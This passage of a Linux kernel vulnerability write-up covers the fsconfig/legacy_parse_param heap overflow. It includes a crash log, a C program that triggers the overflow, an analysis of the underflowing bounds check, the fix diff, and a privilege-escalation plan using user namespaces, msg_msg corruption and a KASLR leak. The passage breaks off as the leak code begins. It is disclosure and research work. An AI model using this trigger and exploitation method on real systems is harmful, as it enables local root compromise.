 entry_SYSCALL_64_after_hwframe+0x44/0xae
netlink: 68 bytes leftover after parsing attributes in process `syz-executor.13'.
netlink: 68 bytes leftover after parsing attributes in process `syz-executor.13'.
netlink: 68 bytes leftover after parsing attributes in process `syz-executor.13'.
netlink: 68 bytes leftover after parsing attributes in process `syz-executor.13'.
autofs4:pid:386120:autofs_fill_super: called with bogus options
autofs4:pid:386117:autofs_fill_super: called with bogus options

The buggy address belongs to the object at ffff88802d7d8000
 which belongs to the cache kmalloc-4k of size 4096
The buggy address is located 0 bytes to the right of
 4096-byte region [ffff88802d7d8000, ffff88802d7d9000)
The buggy address belongs to the page:
page:000000006784204d refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x2d7d8
head:000000006784204d order:3 compound_mapcount:0 compound_pincount:0
flags: 0x100000000010200(slab|head|node=0|zone=1)
raw: 0100000000010200 0000000000000000 0000000200000001 ffff888100043040
raw: 0000000000000000 0000000000040004 00000001ffffffff 0000000000000000
page dumped because: kasan: bad access detected

Memory state around the buggy address:
 ffff88802d7d8f00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 ffff88802d7d8f80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
&gt;ffff88802d7d9000: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
                   ^
 ffff88802d7d9080: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
 ffff88802d7d9100: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc</span></p><p>Fiddling around a bit with the C repro, we found the following snippet could trigger a crash reliably:</p><div style="background-color: whitesmoke; display: block; max-width: 100%; overflow-x: auto;"><p><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">define</span> _GNU_SOURCE</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">include</span> <span class="hljs-string" style="color: #a31515;">&lt;sys/syscall.h&gt;</span></span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">include</span> <span class="hljs-string" style="color: #a31515;">&lt;stdio.h&gt;</span></span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">include</span> <span class="hljs-string" style="color: #a31515;">&lt;stdlib.h&gt;</span></span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">

</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">ifndef</span> __NR_fsconfig</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">define</span> __NR_fsconfig 431</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">endif</span></span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">ifndef</span> __NR_fsopen</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">define</span> __NR_fsopen 430</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">endif</span></span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">define</span> FSCONFIG_SET_STRING 1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">define</span> fsopen(name, flags) syscall(__NR_fsopen, name, flags)</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">#<span class="hljs-keyword" style="color: blue;">define</span> fsconfig(fd, cmd, key, value, aux) syscall(__NR_fsconfig, fd, cmd, key, value, aux)</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">

</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> </span><span class="hljs-title function_" style="color: #a31515; font-family: monospace; white-space: pre;">main</span><span class="hljs-params" style="font-family: monospace; white-space: pre;">(<span class="hljs-type" style="color: #a31515;">void</span>)</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
{
        </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">char</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">* val = </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
        </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> fd = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
        fd = fsopen(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"9p"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (fd &lt; </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">) {
                </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">puts</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"Opening"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
                </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">exit</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">-1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
        }
        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">for</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> i = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; i &lt; </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">5000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; i++) {
                fsconfig(fd, FSCONFIG_SET_STRING, </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"\x00"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, val, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
        }
        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">return</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
}</span></p></div><p>Now, what exactly is causing the overflow? First of all, what is this <code>fsconfig</code> syscall? According to the <a href="https://patchwork.kernel.org/project/linux-fsdevel/patch/153313723557.13253.9055982745313603422.stgit@warthog.procyon.org.uk/">patch</a> that brought it in: </p><p>Add a syscall for configuring a filesystem creation context and triggering
actions upon it, to be used in conjunction with <code>fsopen</code>, <code>fspick</code> and <code>fsmount</code>.</p><p>For arguments, we need to pass in a file descriptor, along with the 
cmd <code>FSCONFIG_SET_STRING</code> and 2 strings for key and value to reach the 
region of the crash. Per the patch notes for using <code>FSCONFIG_SET_STRING</code>, 
the value must point to a null terminated string, and the final argument
 (the auxiliary value) must be 0. Let&#8217;s go through the path of the stack
 trace, starting at <a href="https://elixir.bootlin.com/linux/v5.14.21/source/fs/fsopen.c#L216"><code>vfs_fsconfig_locked</code></a>. Nothing really pertinent to the bug is here, besides knowing that the default case in its switch statement leads to <a href="https://elixir.bootlin.com/linux/v5.14.21/source/fs/fs_context.c#L127"><code>vs_parse_fs_param</code></a>. Note how it calls the <code>parse_param</code> function pointer from the <code>ops</code> field of the fs_context pointer. As defined by the <a href="https://elixir.bootlin.com/linux/v5.14.21/source/fs/fs_context.c#L637"><code>legacy_fs_context_ops</code></a> structure, this function pointer is what points to <code>legacy_parse_param</code>. </p><p>


</p><p>What exactly determines if something is &#8220;legacy?&#8221; When allocating a filesystem context structure in <a href="https://elixir.bootlin.com/linux/v5.14.21/source/fs/fs_context.c#L288"><code>alloc_fs_context</code></a>, the following happens:&nbsp;</p><div style="background-color: whitesmoke; display: block; max-width: 100%; overflow-x: auto;"><p><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">        </span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">/* <span class="hljs-doctag" style="color: grey;">TODO:</span> Make all filesystems support this unconditionally */</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
        init_fs_context = fc-&gt;fs_type-&gt;init_fs_context;
        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (!init_fs_context)
                init_fs_context = legacy_init_fs_context;</span></p></div><p><code>fs_type</code> is of the type <code>struct file_system_type</code>. Looking at references to the <code>file_system_type</code> struct, we see a whole <a href="https://elixir.bootlin.com/linux/v5.14.21/C/ident/file_system_type">list</a> from different files that handle different file_systems. The one we abused in our exploit was <a href="https://elixir.bootlin.com/linux/v5.14.21/source/fs/ext4/super.c#L6713"><code>ext4</code></a>. Our original fuzzing crash happened on the <a href="https://elixir.bootlin.com/linux/v5.14.21/source/fs/9p/vfs_super.c#L357">Plan 9 filesystem</a>. It seems like in both of these (and a ton of other file systems) don&#8217;t have the <code>init_fs_context</code> field set so they all default to legacy and can go down the path of <code>legacy_parse_param</code>.</p><p>
</p><p>Let&#8217;s take a look at the offending function <a href="https://elixir.bootlin.com/linux/v5.14.21/source/fs/fs_context.c#L525"><code>legacy_parse_param</code></a>:&nbsp;</p><div style="background-color: whitesmoke; display: block; max-width: 100%; overflow-x: auto;"><p><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">static</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> </span><span class="hljs-title function_" style="color: #a31515; font-family: monospace; white-space: pre;">legacy_parse_param</span><span class="hljs-params" style="font-family: monospace; white-space: pre;">(<span class="hljs-keyword" style="color: blue;">struct</span> fs_context *fc, <span class="hljs-keyword" style="color: blue;">struct</span> fs_parameter *param)</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
{
        </span><span class="hljs-class" style="font-family: monospace; white-space: pre;"><span class="hljs-keyword" style="color: blue;">struct</span> <span class="hljs-title" style="color: #a31515;">legacy_fs_context</span> *<span class="hljs-title" style="color: #a31515;">ctx</span> =</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> fc-&gt;fs_private;
        </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">unsigned</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> size = ctx-&gt;data_size;
        </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">size_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> len = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
        </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> ret;

        ret = vfs_parse_fs_param_source(fc, param);
        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (ret != -ENOPARAM)
                </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">return</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> ret;

        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (ctx-&gt;param_type == LEGACY_FS_MONOLITHIC_PARAMS)
                </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">return</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> invalf(fc, </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"VFS: Legacy: Can't mix monolithic and individual options"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);

        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">switch</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (param-&gt;type) {
        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">case</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> fs_value_is_string:
                len = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> + param-&gt;size;
                fallthrough;
        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">case</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> fs_value_is_flag:
                len += </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">strlen</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(param-&gt;key);
                </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">break</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">default</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">:
                </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">return</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> invalf(fc, </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"VFS: Legacy: Parameter type for '%s' not supported"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">,
                              param-&gt;key);
        }

        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (len &gt; PAGE_SIZE - </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">2</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> - size)
                </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">return</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> invalf(fc, </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"VFS: Legacy: Cumulative options too large"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (</span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">strchr</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(param-&gt;key, </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">','</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">) ||
            (param-&gt;type == fs_value_is_string &amp;&amp;
             </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">memchr</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(param-&gt;</span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">string</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">','</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, param-&gt;size)))
                </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">return</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> invalf(fc, </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"VFS: Legacy: Option '%s' contained comma"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">,
                              param-&gt;key);
        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (!ctx-&gt;legacy_data) {
                ctx-&gt;legacy_data = kmalloc(PAGE_SIZE, GFP_KERNEL);
                </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (!ctx-&gt;legacy_data)
                        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">return</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> -ENOMEM;
        }

        ctx-&gt;legacy_data[size++] = </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">','</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
        len = </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">strlen</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(param-&gt;key);
        </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">memcpy</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(ctx-&gt;legacy_data + size, param-&gt;key, len);
        size += len;
        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (param-&gt;type == fs_value_is_string) {
                ctx-&gt;legacy_data[size++] = </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">'='</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
                </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">memcpy</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(ctx-&gt;legacy_data + size, param-&gt;</span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">string</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, param-&gt;size);
                size += param-&gt;size;
        }
        ctx-&gt;legacy_data[size] = </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">'\0'</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
        ctx-&gt;data_size = size;
        ctx-&gt;param_type = LEGACY_FS_INDIVIDUAL_PARAMS;
        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">return</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
}</span></p></div><p>Given that your value points to a string, it will factor in both the length of the value string and the key string. If this is the first time hitting this region (basically if legacy data hasn't been allocated yet), a 4k chunk will be allocated for it. It sets a ",", copies over the key, sets an "=" sign, and then copies over the value of your data before null termination. Well, how can we overflow? You can see the bound check to prevent overflows:</p><div style="background-color: whitesmoke; display: block; max-width: 100%; overflow-x: auto;"><p><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">      </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (len &gt; PAGE_SIZE - </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">2</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> - size)
                </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">return</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> invalf(fc, </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"VFS: Legacy: Cumulative options too large"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);</span></p></div><div class="highlight"><pre></pre></div><p>While this 
bound check will suffice for most cases, if your size is 4095 bytes or 
greater, an integer underflow will occur as <code>size</code> in this 
case is an unsigned int. Hence, trigger the underflow there and you will 
get infinite heap overflow.</p><p>This bug popped up since <a href="https://github.com/torvalds/linux/commit/3e1aeb00e6d132efc151dacc062b38269bc9eccc#diff-c4a9ea83de4a42a0d1bcbaf1f03ce35188f38da4987e0e7a52aae7f04de14a05">5.1-rc1</a>. It&#8217;s important to note that you need the&nbsp;<code>CAP_SYS_ADMIN</code>&nbsp;capability to trigger it, but the permission only <a href="https://elixir.bootlin.com/linux/v5.14.21/source/fs/fsopen.c#L122">needs to be granted in the CURRENT NAMESPACE</a>. Most unprivileged users can just <code>unshare(CLONE_NEWNS|CLONE_NEWUSER)</code> (equivalent of the command <code>unshare -Urm</code>)
 to enter a namespace with the <code>CAP_SYS_ADMIN</code> permission, and abuse the 
bug from there; this is what makes this such a dangerous vulnerability.</p><p>



</p><p>Fixing this is a simple patch. Here&#8217;s the fix clubby789 developed and what we sent to the Linux kernel project.</p><div style="background-color: whitesmoke; display: block; max-width: 100%; overflow-x: auto;"><p><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">diff --git a/fs/fs_context.c b/fs/fs_context.c</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">index de1985eae..a195e516f 100644</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">--- a/fs/fs_context.c</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">+++ b/fs/fs_context.c</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-meta" style="color: #2b91af; font-family: monospace; white-space: pre;">@@ -548,7 +548,7 @@</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> static int legacy_parse_param(struct fs_context *fc, struct fs_parameter *param)
                              param-&gt;key);
        }

</span><span class="hljs-deletion" style="color: #2b91af; font-family: monospace; white-space: pre;">-       if (len &gt; PAGE_SIZE - 2 - size)</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-addition" style="color: #a31515; font-family: monospace; white-space: pre;">+       if (size + len + 2 &gt; PAGE_SIZE)</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
                return invalf(fc, "VFS: Legacy: Cumulative options too large");
        if (strchr(param-&gt;key, ',') ||</span></p></div><p>Ok, but who cares about the patch. Let&#8217;s talk about exploitation now :)</p><p>Our original POC&#8217;s goal was to achieve LPE on Ubuntu, preferably 
20.04 which is probably the most popular? version in use currently. The 
exact kernel we targeted was of version 5.11.0-44. As with most distro 
kernels, there are a ton of hardening options compiled in, like slab 
randomization, slab hardening, usercopy hardening, etc. I&#8217;ve discussed a
 lot about some common kernel hardening measures in previous kernel 
exploitation posts. And of course since these are modern systems, SMAP, 
SMEP, KASLR, and KPTI will be turned on. Being distro images, there are 
also some options that are required for general use that will work to 
our advantage for exploitation, such as <code>CONFIG_CHECKPOINT_RESTORE</code>, 
<code>CONFIG_USER_NS</code>, <code>CONFIG_FUSE</code>, <code>CONFIG_SYSVIPC</code>, and <code>CONFIG_USERFAULTFD</code>.</p><p>What primitives do we have with this bug? Only a 
heap overflow. I wonder if there&#8217;s anything I can do with this to 
escalate privileges&#8230; heap overflow in a 4k slab. This past summer, <a href="https://syst3mfailure.io/">D3v17</a>
 and I teamed up and wrote a series of articles and challenges focused 
on abusing the <code>msg_msg</code> structures for OOB read, arb read, and arb write;
 please take a read at these before I continue as I will be writing with
 the assumption that the reader has this prerequisite knowledge: <a href="https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html">part 1</a>, <a href="https://syst3mfailure.io/wall-of-perdition">part 2</a>.
 Our first challenge and article specifically dealt with a 0x30 byte 
UAF at the very beginning of the <code>msg_msg</code> structure in the 4k slab, so a 
heap overflow in the 4k slab would fit this scenario perfectly. With all
 but one exception, the exact same strategy from our Fire of Salvation 
kernel challenge can be repeated here.</p><p>Before I continue, I would like to make a note about exploit 
stability. Interestingly enough, it seems that newer Linux kernel 
exploit mitigations actually contributed to the stability of the exploit
 we had on Ubuntu. As you will see later on in our exploit, we never did
 a lot of spraying besides some initial sprays to clean up the slabs and
 forcing cpu affinity on one core since each core has their own 
freelist. Wouldn&#8217;t it make sense for slab randomization combined 
with a string based heap overflow to cause many crashes for systems with 
SLUB freelist allocators? </p><p>Well, yes if the freelist pointer was at the beginning of each chunk;
 our attempts at exploiting these versions of the kernel required a lot 
more work related to spraying and never achieved a success rate better 
than 50% (although due to instability issues on the Google Kubernetes&#8217;s 
infrastructure, I had to redevelop the spray even for newer kernel 
versions that should alleviate this corruption problem). Since
 5.7, Linux kernel developers decided to <a href="https://lore.kernel.org/linux-mm/202003051624.AAAC9AECC@keescook/t/">move the freelist pointer to the middle</a>
 to avoid overflows corrupting the kernel heap state. 
This means that as long as my overflow doesn&#8217;t corrupt some very 
important object, I can keep overflowing the first 0x30 bytes (which is 
all that matters for abusing <code>msg_msg</code>) and never corrupt the heap state 
in the 4k pages - this makes it pretty easy to try to leak memory or 
perform an arbitrary write on repeat as we can get a fresh legacy data 
allocation with every new fd we create with <code>fsopen</code>. Thanks mitigations!</p><p>To obtain a KASLR leak on general Linux distributions (again, if 
anything here sounds confusing, refer to the articles from D3v17 and 
me), we just need our legacy data chunk to be allocated right on top of a 4k&nbsp;<span style="font-family: monospace;">msg_msg</span>&nbsp;chunk chained with a kmalloc-32 <code>msg_msgseg</code> chunk. We can use our overflow to adjust the <code>msg_msg</code> size parameter and make it 
larger, and then use <code>MSG_COPY</code> to achieve an OOB leak. If we spray many 
  <code>seq_operations</code> structure using the classic <code>open(&#8220;/proc/self/stat&#8221;, 
O_RDONLY)</code> trick, we will have a high likelihood of an OOB read 
leaking us the pointers within this structure, which will let us rebase 
the kernel and bypass KASLR. </p><p>Note that since we do not have heap leaks and that usercopy hardening
 does heap object bounds checking, we have to rely on <code>MSG_COPY</code>, which 
doesn&#8217;t unlink the <code>msg_msg</code> from its <code>msg_queue</code> (which would then utilize 
the linked list pointers in the first 0x10 bytes of <code>msg_msg</code> objects) and
 uses memcpy to transfer data to a new <code>msg_msg</code> structure before 
usercopying back.</p><p>






</p><p>This following snippet of code should accomplish a KASLR leak:</p><div style="background-color: whitesmoke; display: block; max-width: 100%; overflow-x: auto;"><p><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> </span><span class="hljs-title function_" style="color: #a31515; font-family: monospace; white-space: pre;">do_leak</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> </span><span class="hljs-params" style="font-family: monospace; white-space: pre;">()</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> 
{
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> kbase = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">char</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> pat[</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x1000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">] = {</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">};
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">char</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> buffer[</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x2000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">] = {</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">}, recieved[</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x2000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">] = {</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">};
